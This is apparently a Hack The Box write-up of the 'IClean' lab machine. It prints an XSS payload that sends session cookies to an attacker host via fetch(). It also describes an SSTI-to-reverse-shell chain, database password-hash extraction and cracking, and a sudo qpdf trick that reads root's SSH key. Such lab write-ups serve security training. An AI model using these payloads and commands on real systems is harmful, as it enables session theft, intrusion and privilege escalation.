![IClean](https://github.com/amalcew/htb-writeups/assets/73908014/eead5919-3455-45f1-aae2-6c694e04d86e)

## Reconnaissance & port scanning

Initial engagement with the machine was done by port scanning and web enumeration using provided IP address.

```bash
# Nmap 7.94SVN scan initiated Sun Apr 28 14:49:19 2024 as: nmap -v -sV -sC --open -vvv -oA logs/initial_recon/initial 10.10.11.12
Nmap scan report for 10.10.11.12
Host is up, received syn-ack (0.046s latency).
Scanned at 2024-04-28 14:49:19 CEST for 9s
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 2c:f9:07:77:e3:f1:3a:36:db:f2:3b:94:e3:b7:cf:b2 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBG6uGZlOYFnD/75LXrnuHZ8mODxTWsOQia+qoPaxInXoUxVV4+56Dyk1WaY2apshU+pICxXMqtFR7jb3NRNZGI4=
|   256 4a:91:9f:f2:74:c0:41:81:52:4d:f1:ff:2d:01:78:6b (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJBnDPOYK91Zbdj8B2Q1MzqTtsc6azBJ+9CMI2E//Yyu
80/tcp open  http    syn-ack Apache httpd 2.4.52 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Apr 28 14:49:28 2024 -- 1 IP address (1 host up) scanned in 9.11 seconds
```

Machine hosts a web page:

![01-main](https://github.com/amalcew/htb-writeups/assets/73908014/aca17bb1-ba7d-4d5b-8f1b-06d70922e290)

Using `ffuf` I've enumerated the web page for different directories:

```bash
> ffuf -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://capiclean.htb/FUZZ

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://capiclean.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

login                   [Status: 200, Size: 2106, Words: 297, Lines: 88, Duration: 73ms]
services                [Status: 200, Size: 8592, Words: 2325, Lines: 193, Duration: 84ms]
team                    [Status: 200, Size: 8109, Words: 2068, Lines: 183, Duration: 148ms]
quote                   [Status: 200, Size: 2237, Words: 98, Lines: 90, Duration: 108ms]
logout                  [Status: 302, Size: 189, Words: 18, Lines: 6, Duration: 97ms]
dashboard               [Status: 302, Size: 189, Words: 18, Lines: 6, Duration: 126ms]
choose                  [Status: 200, Size: 6084, Words: 1373, Lines: 154, Duration: 109ms]
                        [Status: 200, Size: 16697, Words: 4654, Lines: 349, Duration: 107ms]
:: Progress: [87664/87664] :: Job [1/1] :: 255 req/sec :: Duration: [0:04:23] :: Errors: 0 ::
```

While dashboard is not accessible, candidates for initial foothold are **login** page and **quote** page which could have some insecure inputs.
I've tested login page for some time, but with no success. Next on the list is quote page, which contains a hint on the initial foothold, as it suggests that page's management team reads the requests sent by a form. 

![02-quote](https://github.com/amalcew/htb-writeups/assets/73908014/7c5dd9f8-2100-4aad-8371-f6b000c299cb)

![image](https://github.com/amalcew/htb-writeups/assets/73908014/e3ec7c81-d1b8-4f3d-9fcd-d1957455f15b)

This means, that the page can be vulnerable to cookie exfiltration via XSS.

## Initial foothold

### XSS Cookie Exfiltration

As I've discovered, the page seems to be vulnerable to XSS attacks. Indeed, the vulnerability exists in insecure parameter `service`. To leverage this vulnerability, it is required to run HTTP server on attack machine and pass the XSS payload to the target. When someone (or something) access the infected page, the HTTP server should receive a exfiltrated cookie.
One of the method to achieve this is using the below payload (it should be percent-encoded) in `service` parameter:

```
<img src=x onerror=fetch("http://xx.xx.xx.xx:1234/"+document.cookie);>
```

As shown below, we can easily intercept the cookie:

![03-cookie_exfiltration](https://github.com/amalcew/htb-writeups/assets/73908014/e6639159-db68-437a-af10-9613d2c1c4d7)

After adding the cookie to the session (in the browser or in Burp) I've accessed the dashboard

![image](https://github.com/amalcew/htb-writeups/assets/73908014/ce1dd1dd-92ee-4391-8258-2740238de43d)

### Server-side Template Injection

As visible, the dashboard is quite simple and does not look like typical admin panel. These kind of panels can be vulnerable to many different attacks, as custom inputs can be improperly sanitized. The dashboard has two sub-pages with inputs, **invoice generator**:

![04-invoice_generator](https://github.com/amalcew/htb-writeups/assets/73908014/a6531f52-4b13-40ca-b3e4-ac8aa4c138be)

and **QR Code generator** (available after passing the invoice id):

![05-invoice_generated](https://github.com/amalcew/htb-writeups/assets/73908014/6cbcd8a3-ab3c-43ef-b549-abd3ec62f5eb)

![06-ssti](https://github.com/amalcew/htb-writeups/assets/73908014/d12d06d7-89ba-4938-9517-321ea633bf48)

Submiting the standard SSTI payload did not returns anything in the browser, but things change drastically when executing the request with Burp:

![07-ssti_vuln](https://github.com/amalcew/htb-writeups/assets/73908014/1248cf53-4bd1-4fcc-8533-71085c352fba)

Bingo! Now everyting that I need to do is to gain RCE over the vulnerable server. Server has some kind of filter, as many of the payloads did not work, but finally I've found the bypass on [Payload All The Things](https://swisskyrepo.github.io/PayloadsAllTheThings/Server%20Side%20Template%20Injection/#jinja2-filter-bypass) cheatsheet utilizing `\x5f` sign that worked on the target website:

![image](https://github.com/amalcew/htb-writeups/assets/73908014/a2d02eac-1ea4-4cb6-a07c-de97d48f1610)

To gain RCE we need to pass the reverse shell, for example standard bash reverse shell. 

![image](https://github.com/amalcew/htb-writeups/assets/73908014/77ba21df-e0a9-41de-87f9-5ea8ac4e48a5)

This way we gain the access to the bash shell of `www-data` user on the server:

```bash
> nc -lnvp 1234   
listening on [any] 1234 ...
connect to [xx.xx.xx.xx] from (UNKNOWN) [10.10.11.12] 48508
bash: cannot set terminal process group (1217): Inappropriate ioctl for device
bash: no job control in this shell
www-data@iclean:/opt/app$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Lateral movement

As we have access to `www-data` and not standard Linux user, we need to leverage the access. Greping the `/etc/passwd` we can see which users have `home` directory and access to the shell:

```bash
www-data@iclean:/opt/app$ cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
consuela:x:1000:1000:consuela:/home/consuela:/bin/bash
```

Okay, there is some user named `consuela`, which indeed have `home` directory. Exploring the environment we landed in, we can see that there is a Flask script, which contains hardcoded db credentials:

```bash
www-data@iclean:/opt/app$ cat app.py
from flask import Flask, render_template, request, jsonify, make_response, session, redirect, url_for
from flask import render_template_string
import pymysql
import hashlib
import os
import random, string
import pyqrcode
from jinja2 import StrictUndefined
from io import BytesIO
import re, requests, base64

app = Flask(__name__)

app.config['SESSION_COOKIE_HTTPONLY'] = False

secret_key = ''.join(random.choice(string.ascii_lowercase) for i in range(64))
app.secret_key = secret_key
# Database Configuration
db_config = {
    'host': '127.0.0.1',
    'user': 'iclean',
    'password': 'p**********b',
    'database': 'capiclean'
}

... SNIP ...
```

The database that is running is probably an MariaDB, because of utilized ports `3306` and `33060`:

```bash
www-data@iclean:/opt/app$ netstat -tulpn
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:38463         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      1217/python3        
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 224.0.0.251:5353        0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:5353            0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:46552           0.0.0.0:*                           -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -                   
udp6       0      0 :::5353                 :::*                                -                   
udp6       0      0 :::45736                :::*                                -
```

We can access the database via terminal with disclosed credentials and extract the password hash of user `consuela`:

```bash
www-data@iclean:/opt/app$ mysql -u iclean -p************ capiclean
mysql: [Warning] Using a password on the command line interface can be insecure.
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 4819
Server version: 8.0.36-0ubuntu0.22.04.1 (Ubuntu)

Copyright (c) 2000, 2024, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show tables;
+---------------------+
| Tables_in_capiclean |
+---------------------+
| quote_requests      |
| services            |
| users               |
+---------------------+
3 rows in set (0.00 sec)

mysql> select * from users;
+----+----------+------------------------------------------------------------------+----------------------------------+
| id | username | password                                                         | role_id                          |
+----+----------+------------------------------------------------------------------+----------------------------------+
|  1 | admin    | 2a************************************************************** | 21232f297a57a5a743894a0e4a801fc3 |
|  2 | consuela | 0a************************************************************** | ee11cbb19052e40b07aac0ca060c23ee |
+----+----------+------------------------------------------------------------------+----------------------------------+
2 rows in set (0.00 sec)
```

The hash is crackable, for example using `john`:

```bash
> john --format=raw-sha256 --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA256 [SHA256 256/256 AVX2 8x])
Warning: poor OpenMP scalability for this hash type, consider --fork=4
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
**************** (?)     
1g 0:00:00:00 DONE (2024-04-28 17:48) 2.941g/s 11179Kp/s 11179Kc/s 11179KC/s sisqosgirl..shikimika
Use the "--show --format=Raw-SHA256" options to display all of the cracked passwords reliably
Session completed. 
```

And using the password I've gained access to user `consuela` and its flag:

```bash
www-data@iclean:/opt/app$ su - consuela
Password: 
consuela@iclean:~$ id
uid=1000(consuela) gid=1000(consuela) groups=1000(consuela)
consuela@iclean:~$ ls
user.txt
consuela@iclean:~$ cat user.txt 
df****************************76
```

## Privileges escalation

To elevate the access to root we can use a `qpdf` tool that is available to run with sudo privs:

```bash
consuela@iclean:~$ sudo -l
[sudo] password for consuela: 
Matching Defaults entries for consuela on iclean:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User consuela may run the following commands on iclean:
    (ALL) /usr/bin/qpdf
```

This tool is probably used by the machine to generate the invoices, but should not be run with `sudo` as it is possible to unprivileged file exfiltration on the system, [using  `--add-attachment` flag](https://qpdf.readthedocs.io/en/stable/cli.html?source=post_page-----cfc46f351353--------------------------------#option-add-attachment). With this method, we can access any file present in `/root` directory, like the root flag or **id_rsa** that will allow to gain root access over the machine:

```bash
consuela@iclean:~$ sudo /usr/bin/qpdf --empty ~/rsa.txt --qdf --add-attachment /root/.ssh/id_rsa --
consuela@iclean:~$ cat rsa.txt 
%PDF-1.3
%����
%QDF-1.0

... SNIP ...

  /Type /EmbeddedFile
  /Length 6 0 R
>>
stream
-----BEGIN OPENSSH PRIVATE KEY-----
b3********************************************************************
**********************************************************************
**********************************************************************
**********************************************************************
**********************************************************************
**********************************************************************
**********************************************************************
****BQ==
-----END OPENSSH PRIVATE KEY-----
endstream
endobj

... SNIP ...
```

With the root private key we can log in as root via ssh:

```bash
> ssh -i data/root_id_rsa root@10.10.11.12
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

  System information as of Sat May 11 03:54:27 PM UTC 2024




Expanded Security Maintenance for Applications is not enabled.

3 updates can be applied immediately.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Fri May 10 18:32:55 2024 from xx.xx.xx.xx
root@iclean:~# cat root.txt 
49****************************08
```
